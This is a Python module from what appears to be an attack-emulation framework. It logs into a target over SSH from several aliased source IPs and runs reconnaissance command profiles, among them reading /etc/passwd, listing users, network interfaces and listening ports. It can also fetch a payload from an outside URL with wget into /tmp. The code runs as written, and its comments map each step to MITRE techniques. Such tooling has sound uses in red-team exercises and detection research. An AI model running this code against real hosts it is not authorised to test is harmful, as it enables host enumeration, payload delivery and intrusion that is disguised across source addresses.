"""SSH post-authentication command execution module."""

from __future__ import annotations

import logging
import random
import socket
import time
from datetime import datetime, timezone

import paramiko

from attacks.config import PhaseConfig
from attacks.modules.base import AttackModule, AttackModuleRegistry, AttackResult, TimingProfile

# ── Command Profiles ──────────────────────────────────────────────────

COMMAND_PROFILES: dict[str, list[str]] = {
    "system_profiler": [
        "uname -a",
        "cat /proc/cpuinfo",
        "cat /proc/meminfo",
        "lspci",
        "df -h",
    ],
    "user_enum": [
        "cat /etc/passwd",
        "whoami",
        "id",
        "w",
        "last",
    ],
    "net_enum": [
        "ip a",
        "ss -tlnp",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
    ],
    "full_recon": [
        "uname -a",
        "cat /proc/cpuinfo",
        "cat /proc/meminfo",
        "lspci",
        "df -h",
        "cat /etc/passwd",
        "whoami",
        "id",
        "w",
        "last",
        "ip a",
        "ss -tlnp",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
    ],
}


@AttackModuleRegistry.register("ssh_post_auth")
class SSHPostAuthModule(AttackModule):
    """Post-authentication SSH command execution from aliased source IPs.

    Logs in with known-good credentials, executes system profiling /
    enumeration commands, and optionally downloads a payload via wget.
    Covers MITRE T1059.004 (TA0002 Execution) with sub-techniques
    depending on command profile (T1082, T1087.001, T1016, T1105).
    """

    def execute(
        self,
        target: str,
        phase: PhaseConfig,
        ips: list[str],
        rng: random.Random,
        logger: logging.Logger,
    ) -> AttackResult:
        username = phase.params.get("username", "researcher")
        password = phase.params.get("password", "changeme")
        profile_name = phase.params.get("command_profile", "system_profiler")
        explicit_commands = phase.params.get("commands")
        download_url = phase.params.get("download_url")
        port = phase.params.get("target_port", 22)
        delay_range = phase.params.get("inter_command_delay_ms", [500, 3000])
        timing = TimingProfile(phase.timing)
        duration = phase.timing.duration_seconds

        # Resolve command list
        if explicit_commands:
            commands = list(explicit_commands)
        elif profile_name in COMMAND_PROFILES:
            commands = list(COMMAND_PROFILES[profile_name])
        else:
            raise ValueError(
                f"Unknown command_profile {profile_name!r}. "
                f"Available: {sorted(COMMAND_PROFILES.keys())}"
            )

        if download_url:
            commands.append(f"wget -q -O /tmp/payload {download_url}")

        start_time = datetime.now(timezone.utc)
        deadline = time.monotonic() + duration
        attempts = 0
        successes = 0
        errors: list[str] = []
        commands_executed: list[str] = []

        logger.info(
            "Starting post-auth execution on %s:%d — profile=%s, %d commands, %d IPs (duration: %ds)",
            target, port, profile_name, len(commands), len(ips), duration,
        )

        for src_ip in ips:
            if time.monotonic() >= deadline:
                logger.info("Duration exceeded, stopping")
                break

            elapsed = time.monotonic() - (deadline - duration)
            progress = min(elapsed / duration, 1.0)

            result = self._run_session(
                target, port, src_ip, username, password,
                commands, delay_range, rng, logger,
            )
            attempts += 1

            if result is not None:
                successes += 1
                commands_executed.extend(result)
            else:
                errors.append(f"Session failed from {src_ip}")

            # Apply timing profile delay between sessions
            delay_ms = timing.get_jitter_ms(progress, rng)
            time.sleep(delay_ms / 1000.0)

        end_time = datetime.now(timezone.utc)
        logger.info(
            "Post-auth execution complete: %d sessions, %d successful, %d commands run",
            attempts, successes, len(commands_executed),
        )

        return AttackResult(
            phase_name=phase.name,
            module_name=self.name,
            start_time=start_time,
            end_time=end_time,
            source_ips=ips,
            attempts=attempts,
            successes=successes,
            errors=errors[:10],
            metadata={
                "command_profile": profile_name,
                "commands": commands,
                "commands_executed": commands_executed,
                "download_url": download_url,
                "port": port,
            },
        )

    @staticmethod
    def _run_session(
        target: str,
        port: int,
        src_ip: str,
        username: str,
        password: str,
        commands: list[str],
        delay_range: list[int],
        rng: random.Random,
        logger: logging.Logger,
    ) -> list[str] | None:
        """SSH in and execute commands. Returns list of executed commands, or None on failure."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        executed: list[str] = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.bind((src_ip, 0))
            sock.connect((target, port))

            client.connect(
                target,
                port=port,
                username=username,
                password=password,
                sock=sock,
                timeout=10,
                look_for_keys=False,
                allow_agent=False,
            )

            for cmd in commands:
                logger.debug("Executing on %s from %s: %s", target, src_ip, cmd)
                _stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
                stdout.channel.recv_exit_status()
                executed.append(cmd)

                # Inter-command delay for realism
                delay_ms = rng.uniform(delay_range[0], delay_range[1])
                time.sleep(delay_ms / 1000.0)

            return executed

        except paramiko.AuthenticationException:
            logger.warning("Auth failed for %s@%s from %s", username, target, src_ip)
            return None
        except Exception as e:
            logger.debug("SSH session error from %s: %s", src_ip, e)
            return None
        finally:
            client.close()
